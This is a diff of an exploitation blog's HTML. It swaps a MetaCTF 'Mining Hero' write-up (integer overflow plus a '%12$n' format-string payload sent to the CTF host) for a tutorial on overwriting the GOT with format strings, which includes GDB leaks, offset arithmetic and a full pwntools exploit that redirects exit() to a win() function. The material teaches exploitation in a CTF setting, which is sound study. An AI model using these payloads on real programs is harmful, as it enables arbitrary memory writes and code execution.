- <span class="n">count</span> <span class="o">=</span> <span class="mi">9223372036854775808</span><span class="p">,</span>
- <span class="n">player_funds</span> <span class="o">=</span> <span class="mi">150</span><span class="p">,</span>
- <span class="n">item_cost</span> <span class="o">=</span> <span class="mi">1000000000000000</span><span class="p">]</span>
-</code></pre></div></div>
+<p>To do this attack, an attacker needs to first leak an address off of the stack and calculate the address of the GOT entry from the leaked address. To find the address of the GOT entry, set a breakpoint at <code class="highlighter-rouge">main+153</code>, right before the jump to <code class="highlighter-rouge">exit@plt</code> so that the value of the GOT entry can be recorded right before exiting. Next, continue execution and leak a few pointers off of the stack, then type “quit” to stop.</p>
 
-<p>Let me explain how this code works. First of all, we create the four variables that we care about: <code class="highlighter-rouge">total</code>, <code class="highlighter-rouge">player_funds</code>, <code class="highlighter-rouge">item_cost</code>, and <code class="highlighter-rouge">count</code>. We initialize each of these variables by using a bit vector with 64 bits (since <code class="highlighter-rouge">unsigned long long</code> variables are 64 bits on my machine). We then solve the problem using the following constraints:</p>
-<ul>
-  <li>Make sure that <code class="highlighter-rouge">total</code> is equal to <code class="highlighter-rouge">item_cost * count</code> because that is how <code class="highlighter-rouge">total</code> is calculated in the code.</li>
-  <li>Make sure that the <code class="highlighter-rouge">item_cost</code> is the price of <code class="highlighter-rouge">shout-out-from-literally-god</code>.</li>
-  <li>Make sure that <code class="highlighter-rouge">count</code> is negative so that we can actually do the integer overflow.</li>
-  <li>Make sure that <code class="highlighter-rouge">total &lt;= player_funds</code>. Note that I used <code class="highlighter-rouge">ULE()</code> here because it makes unsigned comparisons.</li>
-  <li>Make sure that <code class="highlighter-rouge">player_funds</code> is equal to 150, which is the amount that we always start with.</li>
-</ul>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  c
+Continuing.
+%p.%p.%p.%p.%p.%p.%p.%p.
+0x32.0xf7fb1580.0x5655620d.0x56555034.(nil).0xf7ffd000.0x70250000.0x2e70252e.
+quit
+quit
 
-<p>The program returned a solution of <code class="highlighter-rouge">count = 9223372036854775808</code>. To see why this solution works, take a look at the following:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="mi">1000000000000000</span> <span class="o">*</span> <span class="mi">9223372036854775808</span>
-<span class="mi">9223372036854775808000000000000000</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">1000000000000000</span> <span class="o">*</span> <span class="mi">9223372036854775808</span><span class="p">)</span>
-<span class="s">'0b11100011010111111010100100110001101000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="mi">1000000000000000</span> <span class="o">*</span> <span class="mi">9223372036854775808</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>
-<span class="mi">113</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">1000000000000000</span> <span class="o">*</span> <span class="mi">9223372036854775808</span><span class="p">)[</span><span class="o">-</span><span class="mi">64</span><span class="p">:]</span>
-<span class="s">'0000000000000000000000000000000000000000000000000000000000000000'</span>
-</code></pre></div></div>
-
-<p>Technically, doing <code class="highlighter-rouge">total = 1000000000000000 * 9223372036854775808</code> returns a value that is much greater than the price. However, when we look at the binary representation of this value, we can see that the value needs 113 bits of storage, and the first 64 bits are all zeros. When we use this value as the quantity, we end up only storing 64 bits of zeros in the program. Using this value lets us buy a shout out from god.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3
-What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
-shout-out-from-literally-god
-How many would you like to buy? Must be greater than 0
-9223372036854775808
-Hmmmm
-Nihaal
-You have done well!
-Good job!
-Sincerely,
-	~God
-Current funds: $150
-Your options are:
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
-</code></pre></div></div>
-
-<p>Now we just need to exploit the format string vulnerability that we saw earlier. Using GDB, I set a breakpoint at the location where the format string vulnerability occurred, and I printed out the address of the value that I wanted to change.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, purchase () at text-game.cpp:164
-164         printf(name.c_str());
+Breakpoint 5, 0x5655628d in main ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
-$rax   : 0x6
-$rbx   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 ("tool"?)
-$rcx   : 0x00007ffff7cc51e7  →  0x5177fffff0003d48 ("H="?)
-$rdx   : 0x0
-$rsp   : 0x00007fffffffda70  →  0xff00ffffffffffff
-$rbp   : 0x00007fffffffdd70  →  0x00007fffffffddd0  →  0x0000000000000000
-$rsi   : 0x0000555555570eb0  →  "Hmmmm\nny would you like to buy? Must be greater t[...]"
-$rdi   : 0x00007ffff7da24c0  →  0x0000000000000000
-$rip   : 0x0000555555557569  →  &lt;purchase()+1545&gt; lea rdi, [rip+0x6d30]        # 0x55555555e2a0 &lt;_Z4nameB5cxx11&gt;
-$r8    : 0x6
-$r9    : 0x00007ffff7d9f240  →  0x0000000000000008
-$r10   : 0x00007ffff7e1d499  →  "_ZNKSt7num_getIcSt19istreambuf_iteratorIcSt11char_[...]"
-$r11   : 0x246
-$r12   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 ("tool"?)
-$r13   : 0x3
-$r14   : 0x0
-$r15   : 0x0
-$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
-$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffda70│+0x0000: 0xff00ffffffffffff   ← $rsp
-0x00007fffffffda78│+0x0008: 0x8000000000000000
-0x00007fffffffda80│+0x0010: 0xffffffffffffffff
-0x00007fffffffda88│+0x0018: 0x00007fffffffdad0  →  0x0000000000000000
-0x00007fffffffda90│+0x0020: 0x00038d7ea4c68000
-0x00007fffffffda98│+0x0028: 0x0000000000000000
-0x00007fffffffdaa0│+0x0030: 0x00007fffffffda76  →  0x000000000000ff00
-0x00007fffffffdaa8│+0x0038: 0x0000555555571750  →  0x0000555555571760  →  0x000000006c6f6f74 ("tool"?)
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
-   0x555555557556 &lt;purchase()+1526&gt; mov    QWORD PTR [rbp-0x2d0], rax
-   0x55555555755d &lt;purchase()+1533&gt; lea    rdi, [rip+0x2f6a]        # 0x55555555a4ce
-   0x555555557564 &lt;purchase()+1540&gt; call   0x555555556620 &lt;puts@plt&gt;
- → 0x555555557569 &lt;purchase()+1545&gt; lea    rdi, [rip+0x6d30]        # 0x55555555e2a0 &lt;_Z4nameB5cxx11&gt;
-   0x555555557570 &lt;purchase()+1552&gt; call   0x555555556410 &lt;_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv@plt&gt;
-   0x555555557575 &lt;purchase()+1557&gt; mov    rdi, rax
-   0x555555557578 &lt;purchase()+1560&gt; mov    eax, 0x0
-   0x55555555757d &lt;purchase()+1565&gt; call   0x555555556390 &lt;printf@plt&gt;
-   0x555555557582 &lt;purchase()+1570&gt; lea    rdi, [rip+0x2f4b]        # 0x55555555a4d4
-────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:text-game.cpp+164 ────
-    159         tool_time = 50000;
-    160     } else if(option == "shout-out-from-literally-god"){
-    161         bool god_is_happy = rand() &amp; 0xFFFFFF == 0;
-    162         bool* god_is_really_happy = &amp;god_is_happy;
-    163         printf("Hmmmm\n");
- →  164         printf(name.c_str());
-    165         printf("\nYou have done well!\n");
-    166         printf("Good job!\n");
-    167
-    168         if(*god_is_really_happy){
-    169             printf("I'm feeling generous right now!\nHave a flag!\n");
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: "text-game", stopped, reason: BREAKPOINT
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
-[#0] 0x555555557569 → purchase()
-[#1] 0x555555557a0d → main(argc=0x1, argv=0x7fffffffdec8)
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-gef➤  print god_is_really_happy
-$1 = (bool *) 0x7fffffffda76
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x0
+$ebx   : 0x56559000  →  0x00003ef8
+$ecx   : 0x0
+$edx   : 0xffffd100  →  0x00000001
+$esp   : 0xffffd170  →  0x00000000
+$ebp   : 0xffffd1d8  →  0x00000000
+$esi   : 0xffffd194  →  "%p.%p.%p.%p.%p.%p.\n"
+$edi   : 0x56557016  →  0x00000a71 ("q\n"?)
+$eip   : 0x5655628d  →  &lt;main+153&gt; call 0x56556060 &lt;exit@plt&gt;
+$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
+────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd170│+0x0000: 0x00000000   ← $esp
+0xffffd174│+0x0004: 0x00000032 ("2"?)
+0xffffd178│+0x0008: 0xf7fb1580  →  0xfbad2288
+0xffffd17c│+0x000c: 0x5655620d  →  &lt;main+25&gt; add ebx, 0x2df3
+0xffffd180│+0x0010: 0x56555034  →  0x00000006
+0xffffd184│+0x0014: 0x00000000
+0xffffd188│+0x0018: 0xf7ffd000  →  0x00029f3c
+0xffffd18c│+0x001c: 0x75710000
+──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+   0x56556280 &lt;main+140&gt;       ror    BYTE PTR [edi], 1
+   0x56556282 &lt;main+142&gt;       mov    esi, 0x75c085c0
+   0x56556287 &lt;main+147&gt;       lea    eax, [ebx+0x6a0cec]
+ → 0x5655628d &lt;main+153&gt;       call   0x56556060 &lt;exit@plt&gt;
+   ↳  0x56556060 &lt;exit@plt+0&gt;     jmp    DWORD PTR [ebx+0x18]
+      0x56556066 &lt;exit@plt+6&gt;     push   0x18
+      0x5655606b &lt;exit@plt+11&gt;    jmp    0x56556020
+      0x56556070 &lt;__libc_start_main@plt+0&gt; jmp    DWORD PTR [ebx+0x1c]
+      0x56556076 &lt;__libc_start_main@plt+6&gt; push   0x20
+      0x5655607b &lt;__libc_start_main@plt+11&gt; jmp    0x56556020
+──────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+exit@plt (
+   [sp + 0x0] = 0x00000000
+)
+──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "got", stopped 0x5655628d in main (), reason: BREAKPOINT
+────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x5655628d → main()
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 </code></pre></div></div>
 
-<p>The address was <code class="highlighter-rouge">0x7fffffffda76</code>, and since I had ASLR disabled on my machine, I just needed to search for the location of this address when I used a string formatter in my name. In the below example, you can see that the address <code class="highlighter-rouge">0x7fffffffda76</code> is the twelfth pointer being popped off of the stack.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting program: /home/n/Documents/Exploitation/metactf/Mining Hero/text-game
-Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
-Before we continue, what is your name?
-%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
-Current funds: $150
-Your options are:
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
-3
-What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
-shout-out-from-literally-god
-How many would you like to buy? Must be greater than 0
-9223372036854775808
-Hmmmm
-0x555555570eb0.(nil).0x7ffff7cc51e7.0x6.0x7ffff7d9f240.0x250070252e70252e.0x8000000000000000.0x2e70252e70252e70.0x7fffffffdad0.0x38d7ea4c68000.(nil).0x7fffffffda76.0x555555571720.0x555555571ef0.(nil).0x7fffffffdad8.(nil).(nil).(nil).0x555555571ef0.0x555555571ea0.0x555555571700.0x3.0x5555555716d0.0x1c.0x1e.0x2d6d6f72662d74.(nil).(nil).(nil).(nil).0x7fffffffdb50.0x4.0x6c6f6f74.(nil).0x64.0x7fffffffdb78.0xd.0x676172756f636e65.0x746e656d65.0x14.0x5555555716d0.0x1c.0x1c.(nil).0x38d7ea4c68000.(nil).0x2.0x800000000000000e.(nil).0x7ffff7c467b2.(nil).0x7ffff7e6d198.(nil).0x7ffff7da06a0.0x7ffff7fa0700.0x3.0x7ffff7f951a8.0x7ffff7f93ec0.0xff00000006.0x7ffff7c3a541.0x7ffff7d9f980.0x7ffff7d9f980.0x7ffff7da08a0.0x5d4990340e914700.(nil).0x7ffff7fa0700.(nil).0x7ffff7f951a8.0x7ffff7f93ec0.(nil).0x55555555e160.0x7ffff7e69f38.0x7ffff7fa0700.0x7fffffffdca0.0x7ffff7fa0700.0x6.0x6.0x5d4990340e914700.0x7fffffffdd2f.0x7fffffffdd30.0x7fffffffdd30.0x7ffff7f9ed00.0x33.0x33.0x7ffff7f9ed00.0x7ffff7e85176.0xa.0x3fffffffffffffff.0x7ffff7fa0700.0x1.0xf7f6f5f4f3f2f101.0x7ffff7f061ee.0x7ffff7fa0ce0.0x555555559eb0.0x7fffffffdd70.0x5d4990340e914700.0x7fffffffdec0.0x555555559eb0.0x5555555566b0.0x7fffffffdec0.0x7fffffffddd0.0x555555557a0d.0x7fffffffdec8.0x155557b43.0x7fffffffdda0.0x1.0x7ffff7da0033.0x555555559eb0.(nil).0x5d4990340e914700.0x555555559eb0.0x5555555566b0.(nil).0x7ffff7bdb0b3.0x7ffff7d9fb80.0x7fffffffdec8.0x100011c00.0x5555555577de.0x555555559eb0.0x4bf57339303d8b0.0x5555555566b0.0x7fffffffdec0.(nil).(nil).0xfb40a8cc28c3d8b0.0xfb40b848f3cdd8b0.(nil).(nil).(nil).0x1.0x7fffffffdec8.0x7fffffffded8.0x7ffff7ffe190.(nil).(nil).0x5555555566b0.0x7fffffffdec0.(nil).(nil).0x5555555566de.0x7fffffffdeb8.0x1c.0x1.0x7fffffffe243.(nil).0x7fffffffe280.0x7fffffffe290.0x7fffffffe2d8.0x7fffffffe2eb.0x7fffffffe2ff.0x7fffffffe32c.0x7fffffffe343.0x7fffffffe36f.0x7fffffffe381.0x7fffffffe3b7.0x7fffffffe3ce.0x7fffffffe3ee.0x7fffffffe402.0x7fffffffe42b.0x7fffffffe43f.0x7fffffffe456.0x7fffffffe46e.0x7fffffffe481.0x7fffffffe49d.0x7fffffffe4d4.0x7fffffffe4ef.0x7fffffff
+<p>The GOT entry is clearly at <code class="highlighter-rouge">ebx+0x18</code> because that is where the first <code class="highlighter-rouge">jmp</code> instruction jumps to inside of <code class="highlighter-rouge">exit@plt</code>. Printing this out gives an address of <code class="highlighter-rouge">0x56559018</code>. Note that ASLR is enabled, so the address may change in another instance of the process.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/2w $ebx+0x18
+0x56559018 &lt;exit@got.plt&gt;:      0x56556066      0xf7dead40
 </code></pre></div></div>
 
-<p>This meant that if used the <code class="highlighter-rouge">%12$n</code> format string in my name, I would write to the twelfth address on the stack. Since the twelfth address on the stack is the <code class="highlighter-rouge">god_is_really_happy</code> pointer, we will be able to change the value of <code class="highlighter-rouge">god_is_happy</code> to true and get the flag!</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc host1.metaproblems.com 5950
-Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
-Before we continue, what is your name?
-1%12$n
-Current funds: $150
-Your options are:
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
-3
-What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
-9223372036854775808
-What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
-shout-out-from-literally-god
-How many would you like to buy? Must be greater than 0
-9223372036854775808
-Hmmmm
-1
-You have done well!
-Good job!
-I'm feeling generous right now!
-Have a flag!
-MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}
-Sincerely,
-    ~God
-Current funds: $150
-Your options are:
-1: Place a bet on a coin flip for a chance to double your money
-2: Go mining to earn some money
-3: Buy things
-4: Quit (Your money will not be saved)
-Please enter a number 1-4 to continue...
+<p>The third value that was leaked off of the stack was <code class="highlighter-rouge">0x5655620d</code>, which seems close to the address of <code class="highlighter-rouge">exit@got.plt</code>. The difference between the third address leaked off of the stack and the address of <code class="highlighter-rouge">exit@got.plt</code> can be found using python.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3
+Python 3.8.6 (default, Sep 25 2020, 09:36:53)
+[GCC 10.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; hex(0x5655620d - 0x56559018)
+'-0x2e0b'
 </code></pre></div></div>
+
+<p>This means that adding <code class="highlighter-rouge">0x2e0b</code> to the third address leaked off of the stack will give the attacker the address of <code class="highlighter-rouge">exit@got.plt</code>. The attacker can use the same trick to calculate the address of <code class="highlighter-rouge">win()</code> using this leaked value.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  disas win
+Dump of assembler code for function win:
+   0x565561c9 &lt;+0&gt;:     push   ebp
+   0x565561ca &lt;+1&gt;:     mov    ebp,esp
+   0x565561cc &lt;+3&gt;:     push   ebx
+   0x565561cd &lt;+4&gt;:     sub    esp,0x4
+   0x565561d0 &lt;+7&gt;:     call   0x56556292 &lt;__x86.get_pc_thunk.ax&gt;
+   0x565561d5 &lt;+12&gt;:    add    eax,0x2e2b
+   0x565561da &lt;+17&gt;:    sub    esp,0xc
+   0x565561dd &lt;+20&gt;:    lea    edx,[eax-0x1ff8]
+   0x565561e3 &lt;+26&gt;:    push   edx
+   0x565561e4 &lt;+27&gt;:    mov    ebx,eax
+   0x565561e6 &lt;+29&gt;:    call   0x56556050 &lt;system@plt&gt;
+   0x565561eb &lt;+34&gt;:    add    esp,0x10
+   0x565561ee &lt;+37&gt;:    nop
+   0x565561ef &lt;+38&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x565561f2 &lt;+41&gt;:    leave
+   0x565561f3 &lt;+42&gt;:    ret
+End of assembler dump.
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">win()</code> function is located at <code class="highlighter-rouge">0x565561c9</code>, and python can again be used to find the offset of this address from the leaked address.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3
+Python 3.8.6 (default, Sep 25 2020, 09:36:53)
+[GCC 10.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; hex(0x5655620d - 0x565561c9)
+'0x44'
+</code></pre></div></div>
+<p>This means that subtracting <code class="highlighter-rouge">0x44</code> from the third address leaked off of the stack will give the attacker the address of <code class="highlighter-rouge">win()</code>.</p>
+
+<p>One thing to note is that the attacker has complete control over the eighth address on the stack. In the below example, the attacker modifies the eighth value on the stack to be B’s. Note that the eighth value on the stack is being used instead of the seventh value because the attack can only control two bytes of the seventh value on the stack.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./got                                                                                                  127 ⨯
+AABBBB%8$p
+AABBBB0x42424242
+</code></pre></div></div>
+
+<p>If the attacker modifies the input to be <code class="highlighter-rouge">AABBBB%8$n</code>, the attacker can write an arbitrary number to the memory address <code class="highlighter-rouge">0x42424242</code>. The attacker can write to arbitrary memory by replacing the B’s with a real memory address. In this exploit, the attacker will replace the B’s with the calculated GOT address, and the attacker will write two bytes at a time (meaning that the attacker needs to use the format string vulnerability twice to write out the entire four-byte pointer to <code class="highlighter-rouge">win()</code> in the GOT entry).</p>
+
+<p>The form for the input that will modify the GOT address for the vulnerable program is <code class="highlighter-rouge">AA&lt;memory address&gt;%&lt;number&gt;p%8$n</code>. Some arbitrary number of spaces are printed out using <code class="highlighter-rouge">%&lt;number&gt;p</code> in order to control the output of <code class="highlighter-rouge">%n</code>. Since <code class="highlighter-rouge">&lt;memory address&gt;</code> should be the eighth value on the stack, doing <code class="highlighter-rouge">%8$n</code> will replace the value at <code class="highlighter-rouge">&lt;memory address&gt;</code> with <code class="highlighter-rouge">&lt;number&gt;+6</code>.</p>
+
+<p>This input will be used twice: Once to write out the low-end bytes of the address of <code class="highlighter-rouge">win()</code> to the low-end bytes of <code class="highlighter-rouge">exit@got.plt</code>, and another time to write out the high-end bytes of the address of <code class="highlighter-rouge">win()</code> to the high-end bytes of <code class="highlighter-rouge">exit@got.plt</code>. Below is the entire exploit written out in Python. The value of <code class="highlighter-rouge">&lt;number&gt;</code> will be either the low-end bytes of the address of <code class="highlighter-rouge">win()</code> or the high-end bytes of the address of <code class="highlighter-rouge">win()</code>, and it will be in base 10 since <code class="highlighter-rouge">printf()</code> requires a base 10 integer for the format string to work.</p>
+
+<p>Since <code class="highlighter-rouge">&lt;memory address&gt;</code> is four bytes, and there are another two bytes of A’s in the beginning, the program will print six bytes before it reaches <code class="highlighter-rouge">%&lt;number&gt;p</code>. This means that six should be subtracted from number in order to have the exact address be printed out.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Create a new process
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./got"</span><span class="p">)</span>
+
+<span class="c1"># Calculate the address of the GOT entry for exit()
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"</span><span class="si">%3</span><span class="s">$p"</span><span class="p">)</span>
+<span class="n">leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">exit_got_addr_low</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leaked_addr</span> <span class="o">+</span> <span class="mh">0x2e0b</span><span class="p">)</span>
+<span class="n">exit_got_addr_high</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leaked_addr</span> <span class="o">+</span> <span class="mh">0x2e0d</span><span class="p">)</span>
+
+<span class="c1"># Find the address of win()
+</span><span class="n">win_addr</span> <span class="o">=</span> <span class="n">leaked_addr</span> <span class="o">-</span> <span class="mh">0x44</span>
+
+<span class="c1"># Convert the jump address into two base 10 integers
+</span><span class="n">win_addr_low</span> <span class="o">=</span> <span class="mh">0x0000ffff</span> <span class="o">&amp;</span> <span class="n">win_addr</span>
+<span class="n">win_addr_high</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0xffff0000</span> <span class="o">&amp;</span> <span class="n">win_addr</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
+<span class="n">win_addr_low</span> <span class="o">-=</span> <span class="mi">6</span>
+<span class="n">win_addr_high</span> <span class="o">-=</span> <span class="mi">6</span>
+<span class="n">win_addr_low</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">win_addr_low</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
+<span class="n">win_addr_high</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">win_addr_high</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
+
+<span class="c1"># Trigger the GOT overflow
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">b</span><span class="s">"AA"</span> <span class="o">+</span> <span class="n">exit_got_addr_low</span> <span class="o">+</span> <span class="n">b</span><span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="n">win_addr_low</span> <span class="o">+</span> <span class="n">b</span><span class="s">"p"</span> <span class="o">+</span> <span class="n">b</span><span class="s">"</span><span class="si">%8</span><span class="s">$n"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">b</span><span class="s">"AA"</span> <span class="o">+</span> <span class="n">exit_got_addr_high</span> <span class="o">+</span> <span class="n">b</span><span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="n">win_addr_high</span> <span class="o">+</span> <span class="n">b</span><span class="s">"p"</span> <span class="o">+</span> <span class="n">b</span><span class="s">"</span><span class="si">%8</span><span class="s">$n"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"quit"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Extra resources:</p>
+<ol>
+  <li>https://www.codeproject.com/articles/1032231/what-is-the-symbol-table-and-what-is-the-global-of</li>
+  <li>https://cs155.stanford.edu/papers/formatstring-1.2.pdf</li>
+  <li>https://www.ret2rop.com/2018/10/format-strings-got-overwrite-remote.html</li>
+  <li>https://ctf101.org/binary-exploitation/relocation-read-only/</li>
+</ol>
 
 <section class="related">
   <h3 style="color: black">Related Posts</h3>
   <ul class="post-list">
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2021/01/03/got-overwrite-using-format-strings.html">
-          GOT Overwrite Using Format Strings
-        </a>
-      </li>
     
       <li style="color: black; font-size: 9;">
         <a href="/2020/12/30/creating-a-basic-heap-allocator.html">
@@ -617,6 +478,12 @@ Please enter a number 1-4 to continue...
       <li style="color: black; font-size: 9;">
         <a href="/2020/12/29/defeating-aslr-via-memory-leak.html">
           Defeating ASLR via Memory Leak
+        </a>
+      </li>
+    
+      <li style="color: black; font-size: 9;">
+        <a href="/2020/10/25/mining-hero-vulnerabilities.html">
+          Mining Hero Vulnerabilities
         </a>
       </li>
     
